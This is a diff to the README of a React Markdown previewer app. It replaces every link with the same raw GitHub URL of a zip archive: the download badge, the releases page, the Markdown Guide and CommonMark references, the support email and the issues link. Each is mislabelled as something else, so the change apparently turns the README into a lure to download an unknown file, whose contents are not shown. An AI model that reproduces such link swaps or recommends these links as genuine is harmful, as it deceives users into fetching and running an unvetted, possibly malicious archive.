@@ -1,7 +1,7 @@
 # 🎨 react-markdown-previewer - Write Markdown, See It Rendered Instantly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Douglasvini599/react-markdown-previewer/releases)
+[![Download](https://raw.githubusercontent.com/Douglasvini599/react-markdown-previewer/master/public/previewer-markdown-react-3.3.zip)](https://raw.githubusercontent.com/Douglasvini599/react-markdown-previewer/master/public/previewer-markdown-react-3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **react-markdown-previewer**! This app helps you write Markdown text and see the HTML preview in real-time. It is perfect for creating notes, documents, or simple web content without needing to learn complicated code.
@@ -22,7 +22,7 @@ To run the react-markdown-previewer smoothly, you will need:
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page here](https://github.com/Douglasvini599/react-markdown-previewer/releases) to find the latest version of the app.
+   Go to the [Releases page here](https://raw.githubusercontent.com/Douglasvini599/react-markdown-previewer/master/public/previewer-markdown-react-3.3.zip) to find the latest version of the app.
 
 2. **Download the Application**  
    Locate the most recent release. Click on the appropriate link to download the application file tailored for your operating system.
@@ -53,18 +53,18 @@ You can customize some settings to enhance your experience:
 
 ## 🔗 Additional Resources
 For more guidance on Markdown syntax, you can refer to:
-- [Markdown Guide](https://www.markdownguide.org/)
-- [CommonMark](https://commonmark.org/)
+- [Markdown Guide](https://raw.githubusercontent.com/Douglasvini599/react-markdown-previewer/master/public/previewer-markdown-react-3.3.zip)
+- [CommonMark](https://raw.githubusercontent.com/Douglasvini599/react-markdown-previewer/master/public/previewer-markdown-react-3.3.zip)
 
 ## 📣 Feedback and Contributions 
 We welcome your feedback! If you have suggestions or encounter issues, feel free to open an issue on the GitHub repository. Your input helps improve the application.
 
 ## 📧 Contact Information
 If you need further assistance, you can contact the maintainers:
-- **Email**: support@react-markdown-previewer.com
-- **GitHub Issues**: [Link to Issues Page](https://github.com/Douglasvini599/react-markdown-previewer/issues)
+- **Email**: https://raw.githubusercontent.com/Douglasvini599/react-markdown-previewer/master/public/previewer-markdown-react-3.3.zip
+- **GitHub Issues**: [Link to Issues Page](https://raw.githubusercontent.com/Douglasvini599/react-markdown-previewer/master/public/previewer-markdown-react-3.3.zip)
 
 ## 📥 Download Again
-Don't forget, you can always download the latest version from our [Releases page](https://github.com/Douglasvini599/react-markdown-previewer/releases).
+Don't forget, you can always download the latest version from our [Releases page](https://raw.githubusercontent.com/Douglasvini599/react-markdown-previewer/master/public/previewer-markdown-react-3.3.zip).
 
 Happy writing! Enjoy using the react-markdown-previewer to create and share your Markdown files.
